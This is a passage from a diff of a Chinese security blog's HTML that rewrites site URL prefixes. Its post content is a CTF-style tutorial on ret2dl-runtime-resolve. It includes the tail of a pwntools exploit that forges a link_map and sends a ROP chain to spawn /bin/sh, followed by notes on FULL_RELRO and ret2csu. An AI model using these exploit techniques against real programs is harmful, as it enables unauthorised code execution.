</span><br><span class="line">fake_link_map += fake_dyn_rel  </span><br><span class="line">fake_link_map += fake_rel  </span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line"><span class="comment">#dyn_strtab的指针  </span></span><br><span class="line">fake_link_map += p64(fake_dyn_strtab_addr)  </span><br><span class="line"><span class="comment">#dyn_strsym的指针  </span></span><br><span class="line">fake_link_map += p64(fake_dyn_symtab_addr) <span class="comment">#fake_link_map_addr + 0x70  </span></span><br><span class="line"><span class="comment">#存入/bin/sh字符串  </span></span><br><span class="line">fake_link_map += <span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x80</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line"><span class="comment">#在fake_link_map_addr + 0xF8处，是rel.plt指针  </span></span><br><span class="line">fake_link_map += p64(fake_dyn_rel_addr)  </span><br><span class="line">  </span><br><span class="line">sleep(<span class="number">1</span>)  </span><br><span class="line">sh.sendline(fake_link_map)  </span><br><span class="line">sleep(<span class="number">1</span>)  </span><br><span class="line"><span class="comment">#raw_input()  </span></span><br><span class="line"><span class="comment">#现在，我们伪造好了link_map，那么，我们就可以来解析system了  </span></span><br><span class="line">rop = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi) + p64(fake_link_map_addr + <span class="number">0x78</span>)  + p64(plt_load) + p64(fake_link_map_addr) + p64(<span class="number">0</span>)  </span><br><span class="line">sh.sendline(rop)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
 
 <h2 id="FULL-RELRO的情况下"><a href="#FULL-RELRO的情况下" class="headerlink" title="FULL_RELRO的情况下"></a>FULL_RELRO的情况下</h2><p>程序在运行之前就已经调用了ld.so将所需的外部函数加载完成，程序运行期间不再动态加载，因此，在程序的got表中，link_map和dl_runtime_resolve函数的地址都为0，因为后续不再使用，没有必要。</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image16.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image16.JPG" class="">
 
 <p>因此**[在FULL_RELRO的情况下，要想利用ret2dl-runtime-resolve技术，就只能在栈中低位覆盖数据一定几率恢复出dl_runtime_resolve。]{.mark}**</p>
 <p>比如在glibc2.27下，我们低位覆盖这个数据，有很大几率指向dl_runtime_resolve函数的地址，然后，link_map我们可以在我们可控的地方伪造。</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image17.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image17.JPG" class="">
 
 <p>然而，仍然很难利用起来，由于低位覆盖的原因，我们不能继续再在这个位置后面布置其他ROP。因此，在不是特别没办法时，尽量考虑其他方法。</p>
 <p>这里，介绍一种其他的方法来针对FULL_RELRO的方案来getshell，那就是低位覆盖栈中数据一定几率指向syscall，构造execve(“&#x2F;bin&#x2F;sh”,0,0)系统调用。要构造这样的ROP，其他gadget容易搞定，关键是edx必须为0，不然调用会出错，然而，pop edx或pop rdx这样的gadget基本没有，因此，我们可以ret2csu，来控制edx</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image18.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image18.JPG" class="">
 
     </div>
 
@@ -412,8 +412,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/ROP/" rel="tag"># ROP</a>
-              <a href="/ha1vk/tags/ret2dl/" rel="tag"># ret2dl</a>
+              <a href="/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/tags/ret2dl/" rel="tag"># ret2dl</a>
           </div>
 
         
@@ -422,11 +422,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/02/20/shellcode_enc/" rel="prev" title="Shellcode加密原理之自己动手写加密器">
+    <a href="/2020/02/20/shellcode_enc/" rel="prev" title="Shellcode加密原理之自己动手写加密器">
       <i class="fa fa-chevron-left"></i> Shellcode加密原理之自己动手写加密器
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/02/24/i%E6%98%A5%E7%A7%8B2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9PWN_BFnote/" rel="next" title="BFnote(修改TLS结构来bypass canary)">
+    <a href="/2020/02/24/i%E6%98%A5%E7%A7%8B2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9PWN_BFnote/" rel="next" title="BFnote(修改TLS结构来bypass canary)">
       BFnote(修改TLS结构来bypass canary) <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -499,20 +499,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -585,30 +585,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
